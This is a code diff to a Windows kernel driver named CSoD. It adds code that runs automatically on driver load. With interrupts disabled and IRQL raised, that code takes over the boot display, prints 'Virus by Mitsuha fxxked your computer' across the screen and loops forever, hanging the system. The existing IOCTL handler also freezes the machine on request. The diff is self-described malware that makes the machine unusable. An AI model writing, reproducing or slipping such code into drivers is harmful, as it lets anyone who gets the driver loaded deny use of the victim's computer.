@@ -2,8 +2,6 @@
 #include "BOOTVID.h"
 #include "ControlCode.h"
 
-#define _CSoD_COLORFUL_SCREEN 0
-
 PDEVICE_OBJECT g_pDeviceObject = NULL;
 UNICODE_STRING g_uniSymbolName = RTL_CONSTANT_STRING(L"\\??\\CSoD");
 
@@ -173,67 +171,67 @@ DeviceIoControl(
 	if (ulInBufferLength == sizeof(CSoD_DATA))
 		switch (pStackLocation->Parameters.DeviceIoControl.IoControlCode)
 		{
-			case CTL_DO_CSoD:
+		case CTL_DO_CSoD:
+		{
+			nUsedLength = sizeof(CSoD_DATA);
+
+			_disable();
+			KIRQL Irql = KeRaiseIrqlToDpcLevel();
+			//GainExlusivity();
+
+			if (InbvIsBootDriverInstalled())
 			{
-				nUsedLength = sizeof(CSoD_DATA);
+				InbvAcquireDisplayOwnership();
+				InbvResetDisplay();
 
-				_disable();
-				GainExlusivity();
-				KIRQL Irql = KeRaiseIrqlToDpcLevel();
+				if (pSystemBuffer->BackColor == BV_COLOR_COLORFUL)
+					InbvSolidColorFill(0, 0, SCREEN_WIDTH - 1, SCREEN_HEIGHT - 1, BV_COLOR_WHITE);
+				else
+					InbvSolidColorFill(0, 0, SCREEN_WIDTH - 1, SCREEN_HEIGHT - 1, pSystemBuffer->BackColor);
 
-				if (InbvIsBootDriverInstalled())
-				{
-					InbvAcquireDisplayOwnership();
-					InbvResetDisplay();
+				if (pSystemBuffer->TextColor == BV_COLOR_COLORFUL)
+					InbvSetTextColor(BV_COLOR_WHITE);
+				else
+					InbvSetTextColor(pSystemBuffer->TextColor);
 
-					if (pSystemBuffer->BackColor == BV_COLOR_COLORFUL)
-						InbvSolidColorFill(0, 0, SCREEN_WIDTH - 1, SCREEN_HEIGHT - 1, BV_COLOR_WHITE);
-					else
-						InbvSolidColorFill(0, 0, SCREEN_WIDTH - 1, SCREEN_HEIGHT - 1, pSystemBuffer->BackColor);
-
-					if (pSystemBuffer->TextColor == BV_COLOR_COLORFUL)
-						InbvSetTextColor(BV_COLOR_WHITE);
-					else
-						InbvSetTextColor(pSystemBuffer->TextColor);
-
-					InbvInstallDisplayStringFilter(NULL);
-					InbvEnableDisplayString(TRUE);
-					InbvSetScrollRegion(0, 0, SCREEN_WIDTH - 1, SCREEN_HEIGHT - 1);
-				}
-
-				InbvDisplayString((PUCHAR)pSystemBuffer->Text);
-
-				if (pSystemBuffer->TextColor == BV_COLOR_COLORFUL || pSystemBuffer->BackColor == BV_COLOR_COLORFUL)
-					while (TRUE)
-						for (SHORT i = 0; i < BV_MAX_COLORS; InterlockedIncrement16(&i))
-							for (SHORT j = 0; j < BV_MAX_COLORS; InterlockedIncrement16(&j))
-								if (InbvIsBootDriverInstalled())
-								{
-									if (pSystemBuffer->BackColor == BV_COLOR_COLORFUL)
-										InbvSolidColorFill(0, 0, SCREEN_WIDTH - 1, SCREEN_HEIGHT - 1, i);
-
-									if (pSystemBuffer->TextColor == BV_COLOR_COLORFUL)
-										InbvSetTextColor(j);
-
-									InbvSetScrollRegion(0, 0, SCREEN_WIDTH - 1, SCREEN_HEIGHT - 1);
-
-									InbvDisplayString((PUCHAR)pSystemBuffer->Text);
-
-									for (LONG w = 0; w < 1024; InterlockedIncrement(&w))
-										;
-								}
-
-				while (TRUE)
-					;
-
-				KeLowerIrql(Irql);
-				ReleaseExclusivity();
-				_enable();
+				InbvInstallDisplayStringFilter(NULL);
+				InbvEnableDisplayString(TRUE);
+				InbvSetScrollRegion(0, 0, SCREEN_WIDTH - 1, SCREEN_HEIGHT - 1);
 			}
 
-			default:
-				ntStatus = STATUS_INVALID_DEVICE_REQUEST;
-				break;
+			InbvDisplayString((PUCHAR)pSystemBuffer->Text);
+
+			if (pSystemBuffer->TextColor == BV_COLOR_COLORFUL || pSystemBuffer->BackColor == BV_COLOR_COLORFUL)
+				while (TRUE)
+					for (SHORT i = 0; i < BV_MAX_COLORS; InterlockedIncrement16(&i))
+						for (SHORT j = 0; j < BV_MAX_COLORS; InterlockedIncrement16(&j))
+							if (InbvIsBootDriverInstalled())
+							{
+								if (pSystemBuffer->BackColor == BV_COLOR_COLORFUL)
+									InbvSolidColorFill(0, 0, SCREEN_WIDTH - 1, SCREEN_HEIGHT - 1, i);
+
+								if (pSystemBuffer->TextColor == BV_COLOR_COLORFUL)
+									InbvSetTextColor(j);
+
+								InbvSetScrollRegion(0, 0, SCREEN_WIDTH - 1, SCREEN_HEIGHT - 1);
+
+								InbvDisplayString((PUCHAR)pSystemBuffer->Text);
+
+								for (LONG w = 0; w < 1024; InterlockedIncrement(&w))
+									__nop();
+							}
+
+			while (TRUE)
+				__nop();
+
+			//ReleaseExclusivity();
+			KeLowerIrql(Irql);
+			_enable();
+		}
+
+		default:
+			ntStatus = STATUS_INVALID_DEVICE_REQUEST;
+			break;
 		}
 
 	pIrp->IoStatus.Information = nUsedLength;
@@ -254,6 +252,9 @@ DriverUnload(
 	IoDeleteDevice(g_pDeviceObject);
 	IoDeleteSymbolicLink(&g_uniSymbolName);
 }
+
+#define _CSoD_ON_LOAD TRUE
+#define _CSoD_COLORFUL_SCREEN FALSE
 
 NTSTATUS
 DriverEntry(
@@ -277,6 +278,75 @@ DriverEntry(
 		g_pDeviceObject->Flags |= DO_BUFFERED_IO;
 		IoCreateSymbolicLink(&g_uniSymbolName, &uniDeviceName);
 	}
+
+#if _CSoD_ON_LOAD
+	_disable();
+	KIRQL Irql = KeRaiseIrqlToDpcLevel();
+	//GainExlusivity();
+
+	if (InbvIsBootDriverInstalled())
+	{
+		InbvAcquireDisplayOwnership();
+		InbvResetDisplay();
+
+#if _CSoD_COLORFUL_SCREEN
+		USHORT LastWidth = 0,
+			LastHeight = 0;
+
+		for (USHORT Width = 0; Width < SCREEN_WIDTH; Width++)
+		{
+			for (USHORT Height = 0; Height < SCREEN_HEIGHT; Height++)
+			{
+				InbvSolidColorFill(LastWidth, LastHeight, Width, Height, BV_MAX_COLORS - ((Width + Height) % BV_MAX_COLORS));
+
+				LastHeight = Height;
+			}
+
+			LastWidth = Width;
+		}
+#else
+		InbvSolidColorFill(0, 0, SCREEN_WIDTH - 1, SCREEN_HEIGHT - 1, BV_COLOR_WHITE);
+#endif
+
+		InbvSetTextColor(BV_COLOR_RED);
+		InbvInstallDisplayStringFilter(NULL);
+		InbvEnableDisplayString(TRUE);
+		InbvSetScrollRegion(0, 0, SCREEN_WIDTH - 1, SCREEN_HEIGHT - 1);
+	}
+
+	CHAR Text1[] = "Virus by Mitsuha fxxked your computer so you got a strange CSoD.";
+
+	for (SHORT j = 0; j < SCREEN_HEIGHT / CHAR_HEIGHT; InterlockedIncrement16(&j))
+	{
+		for (SHORT i = 0; i < (SCREEN_WIDTH / CHAR_WIDTH - sizeof(Text1) + 1) / 2; InterlockedIncrement16(&i))
+			InbvDisplayString((PUCHAR)" ");
+		InbvDisplayString((PUCHAR)Text1);
+		InbvDisplayString((PUCHAR)"\r\n");
+	}
+
+	while (TRUE)
+		for (USHORT Color = 0; Color < BV_MAX_COLORS; Color++)
+		{
+			InbvSolidColorFill(0, 0, SCREEN_WIDTH - 1, SCREEN_HEIGHT - 1, Color);
+
+			InbvSetTextColor(BV_MAX_COLORS - Color);
+			InbvSetScrollRegion(0, 0, SCREEN_WIDTH - 1, SCREEN_HEIGHT - 1);
+			for (SHORT j = 0; j < SCREEN_HEIGHT / CHAR_HEIGHT; InterlockedIncrement16(&j))
+			{
+				for (SHORT i = 0; i < (SCREEN_WIDTH / CHAR_WIDTH - sizeof(Text1) + 1) / 2; InterlockedIncrement16(&i))
+					InbvDisplayString((PUCHAR)" ");
+				InbvDisplayString((PUCHAR)Text1);
+				InbvDisplayString((PUCHAR)"\r\n");
+			}
+		}
+
+	while (TRUE)
+		__nop();
+
+	//ReleaseExclusivity();
+	KeLowerIrql(Irql);
+	_enable();
+#endif
 
 	return STATUS_SUCCESS;
 }
